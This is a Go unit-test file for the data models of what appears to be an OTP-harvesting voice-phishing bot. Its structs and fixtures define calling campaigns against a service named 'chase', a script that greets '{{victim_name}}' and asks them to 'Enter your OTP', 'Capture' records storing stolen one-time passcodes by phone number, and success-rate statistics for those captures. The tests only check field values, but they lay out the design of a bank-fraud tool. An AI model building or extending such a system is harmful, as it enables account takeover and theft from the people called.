package models

import (
	"testing"
)

func TestCampaignStatus(t *testing.T) {
	tests := []struct {
		status   CampaignStatus
		expected string
	}{
		{CampaignStatusPending, "pending"},
		{CampaignStatusActive, "active"},
		{CampaignStatusPaused, "paused"},
		{CampaignStatusCompleted, "completed"},
		{CampaignStatusCancelled, "cancelled"},
	}

	for _, tt := range tests {
		t.Run(string(tt.status), func(t *testing.T) {
			if string(tt.status) != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, string(tt.status))
			}
		})
	}
}

func TestCallStatus(t *testing.T) {
	tests := []struct {
		status   CallStatus
		expected string
	}{
		{CallStatusPending, "pending"},
		{CallStatusRinging, "ringing"},
		{CallStatusAnswered, "answered"},
		{CallStatusVoicemail, "voicemail"},
		{CallStatusNoAnswer, "no_answer"},
		{CallStatusBusy, "busy"},
		{CallStatusFailed, "failed"},
		{CallStatusCompleted, "completed"},
		{CallStatusCancelled, "cancelled"},
	}

	for _, tt := range tests {
		t.Run(string(tt.status), func(t *testing.T) {
			if string(tt.status) != tt.expected {
				t.Errorf("Expected '%s', got '%s'", tt.expected, string(tt.status))
			}
		})
	}
}

func TestCampaignStruct(t *testing.T) {
	campaign := Campaign{
		ID:          1,
		Name:        "Test Campaign",
		Service:     "chase",
		Status:      CampaignStatusActive,
		TotalCalls:  100,
		Completed:   50,
		Captures:    10,
		Concurrency: 5,
	}

	if campaign.ID != 1 {
		t.Errorf("Expected ID 1, got %d", campaign.ID)
	}

	if campaign.Name != "Test Campaign" {
		t.Errorf("Expected Name 'Test Campaign', got '%s'", campaign.Name)
	}

	if campaign.Status != CampaignStatusActive {
		t.Errorf("Expected Status 'active', got '%s'", campaign.Status)
	}

	if campaign.TotalCalls != 100 {
		t.Errorf("Expected TotalCalls 100, got %d", campaign.TotalCalls)
	}
}

func TestCallStruct(t *testing.T) {
	call := Call{
		ID:          1,
		CampaignID:  1,
		Phone:       "+15551234567",
		Status:      CallStatusAnswered,
		Duration:    30,
		PlivoCallID: "uuid-123",
	}

	if call.ID != 1 {
		t.Errorf("Expected ID 1, got %d", call.ID)
	}

	if call.Phone != "+15551234567" {
		t.Errorf("Expected Phone '+15551234567', got '%s'", call.Phone)
	}

	if call.Status != CallStatusAnswered {
		t.Errorf("Expected Status 'answered', got '%s'", call.Status)
	}
}

func TestCaptureStruct(t *testing.T) {
	capture := Capture{
		ID:         1,
		CallID:     1,
		CampaignID: 1,
		Phone:      "+15551234567",
		OTP:        "123456",
		Service:    "chase",
	}

	if capture.OTP != "123456" {
		t.Errorf("Expected OTP '123456', got '%s'", capture.OTP)
	}

	if capture.Service != "chase" {
		t.Errorf("Expected Service 'chase', got '%s'", capture.Service)
	}
}

func TestTemplateStruct(t *testing.T) {
	template := Template{
		ID:             1,
		Name:           "chase",
		Voice:          "en-US-WOMAN",
		Greeting:       "Hello {{victim_name}}",
		ActionPrompt:   "Press 1 to verify",
		OTPPrompt:      "Enter your OTP",
		Confirmation:   "Thank you",
		FallbackMessage: "Call ended",
		HoldMusic:      "",
	}

	if template.Name != "chase" {
		t.Errorf("Expected Name 'chase', got '%s'", template.Name)
	}

	if template.Voice != "en-US-WOMAN" {
		t.Errorf("Expected Voice 'en-US-WOMAN', got '%s'", template.Voice)
	}

	// Test template variable substitution
	expectedGreeting := "Hello Customer"
	actualGreeting := "Hello {{victim_name}}"
	if actualGreeting != expectedGreeting {
		// This is just for documentation - the actual replacement happens in bot logic
	}
}

func TestGlobalStats(t *testing.T) {
	stats := GlobalStats{
		TotalCampaigns:   10,
		ActiveCampaigns: 2,
		TotalCalls:      1000,
		TotalCaptures:   150,
		SuccessRate:     15.0,
		TodayCalls:      100,
		TodayCaptures:   15,
	}

	if stats.TotalCampaigns != 10 {
		t.Errorf("Expected TotalCampaigns 10, got %d", stats.TotalCampaigns)
	}

	if stats.TotalCaptures != 150 {
		t.Errorf("Expected TotalCaptures 150, got %d", stats.TotalCaptures)
	}

	if stats.SuccessRate != 15.0 {
		t.Errorf("Expected SuccessRate 15.0, got %f", stats.SuccessRate)
	}
}
